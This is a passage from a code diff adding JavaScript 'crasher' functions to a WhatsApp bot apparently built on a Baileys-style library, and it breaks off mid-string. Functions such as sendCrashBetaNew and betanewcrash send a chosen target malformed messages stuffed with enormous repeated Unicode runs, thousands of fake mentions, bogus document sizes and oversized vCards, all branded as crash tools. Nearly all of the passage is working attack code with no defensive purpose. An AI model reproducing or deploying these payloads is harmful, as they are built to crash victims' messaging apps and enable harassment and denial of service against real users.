+              externalAdReply: {
+                title: '! 𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫" 🩸',
+                mediaType: 2,
+                renderLargerThumbnail: false,
+                showAdAttribution: false,
+                containsAutoReply: false,
+                body: "© Apocalypse BvG V1",
+                thumbnail: tdxlol,
+                sourceUrl: "t.me/haunteddevv",
+                sourceId: "Apocalypse-crasher",
+                ctwaClid: "cta",
+                ref: "ref",
+                clickToWhatsappCall: true,
+                automatedGreetingMessageShown: false,
+                greetingMessageBody: "crasher",
+                ctaPayload: "cta",
+                disableNudge: true,
+                originalImageUrl: "nando",
+              },
+              featureEligibilities: {
+                cannotBeReactedTo: true,
+                cannotBeRanked: true,
+                canRequestFeedback: true,
+              },
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: "120363274419384848@newsletter",
+                serverMessageId: 1,
+                newsletterName: `Apocalypse Crash V2 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+                contentType: 3,
+                accessibilityText: "crasher",
+              },
+              statusAttributionType: 2,
+              utm: {
+                utmSource: "utm",
+                utmCampaign: "utm2",
+              },
+            },
+            description: "by : Azrael Dev",
+          },
+          messageContextInfo: {
+            messageSecret: crypto.randomBytes(32),
+            supportPayload: JSON.stringify({
+              version: 2,
+              is_ai_message: true,
+              should_show_system_message: true,
+              ticket_id: crypto.randomBytes(16),
+            }),
+          },
+        },
+      },
+    };
+
+    await zephy.relayMessage(target, messagePayload, {
+      additionalNodes: stanza,
+      participant: { jid: target, count: 1 },
+    });
+    console.log(chalk.green.bold(`[✓] Success sent Bug4 to ${target}`));
+  } catch (error) {
+    console.error(chalk.red.bold(`[!] Error sending Bug4:`, error));
+    throw error;
+  }
+}
+
+async function sendCrashBetaNew(target, quoted = true) {
+  const spamText = "‏\n".repeat(122001);
+  const crashText = "ꦽ".repeat(1900);
+  await zephy.relayMessage(
+    target,
+    {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                mimetype:
+                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                fileLength: "9999999999999",
+                pageCount: 1316134911,
+                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                fileName: "₦ӾⱠ ⱤɆVØⱠɄ₮łØ₦",
+                fileEncSha256:
+                  "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                directPath:
+                  "/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1726867151",
+                contactVcard: true,
+                jpegThumbnail: "",
+              },
+              hasMediaAttachment: true,
+            },
+            body: {
+              text: "𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫" + crashText + spamText,
+            },
+            contextInfo: {
+              mentionedJid: ["62831710842976@s.whatsapp.net"],
+              mentions: ["62831710842977@s.whatsapp.net"],
+            },
+            footer: {
+              text: "",
+            },
+            nativeFlowMessage: {},
+            contextInfo: {
+              mentionedJid: [
+                "62831710842977@s.whatsapp.net",
+                ...Array.from(
+                  {
+                    length: 11000,
+                  },
+                  () =>
+                    "1" +
+                    Math.floor(Math.random() * 500000) +
+                    "@s.whatsapp.net"
+                ),
+              ],
+              forwardingScore: 1,
+              isForwarded: true,
+              fromMe: false,
+              participant: "6283171084295@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              quotedMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                  mimetype:
+                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256:
+                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                  fileLength: "9999999999999",
+                  pageCount: 1316134911,
+                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                  fileName: "𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫",
+                  fileEncSha256:
+                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                  directPath:
+                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1724474503",
+                  contactVcard: true,
+                  thumbnailDirectPath:
+                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                  thumbnailSha256:
+                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                  thumbnailEncSha256:
+                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                  jpegThumbnail: "",
+                },
+              },
+            },
+          },
+        },
+      },
+      buttons: [
+        {
+          buttonId: "tes1", // Corrected typo
+          buttonText: {
+            displayText: "Tes1"
+          }
+        },
+        {
+          buttonId: "tes2", // Corrected typo
+          buttonText: {
+            displayText: "Tes2"
+          }
+        }
+      ],
+      viewOnce: true,
+      headerType: 6,
+      quoted: null
+    },
+    quoted
+      ? {
+          participant: { jid: target, count: 1 },
+        }
+      : {}
+  );
+  console.log(chalk.red("Crasher : SendBug"));
+}
+
+async function betanewcrash(target, Ptcp = true) {
+  let virtex = "𝚂̸̴̸̡⃨̺̘͚̝͙̪̘͋̓̾͆̓̔͝͝𝙴̴̴̵̡⃨̼̠͉͉͙͖̠̈́̚̚͘͝͝͠𝙲̴̴̸⃨̺̺̫͕̼͎͇͙̿͊͊̔̓̀͝͝͠𝚁̸̸̴⃨̫̝̦͔͓͎͚͚̿̐͒͋̓͊̒̕͝𝙴̸̵̴⃨̼̝͓̺̙̪͚̘̝̓̓̽̓̽̽͑̕𝚃̸̵̵⃨̫͖̙̟͍̦̪͛̓̐̓͌͐̀͘͠ ཉ";  let tembus = 'ါ'.repeat(2000);
+  const jids = "@0~".repeat(1000);
+  const ui = ' ִ'.repeat(1000);
+  let anjing = new Array()
+  if (!Array.isArray(ui) || ui.length === 77000) {
+    await zephy.relayMessage(target, {
+      groupMentionedMessage: {
+       message: {
+        interactiveMessage: {
+         header: {
+          contactsArrayMessage: {
+    displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + ui + "ꦾ".repeat(1000),
+    contacts: [
+      {
+        displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + jids + "ꦾ".repeat(30000),
+        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+60 17-777 0499\nFN:+60 17-777 0499\nitem1.TEL;waid=60177770499:60177770499\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 𝙹𝙸𝙽𝚂${ui}\nitem2.EMAIL;type=INTERNET:🪭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳🪭${jids}\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘ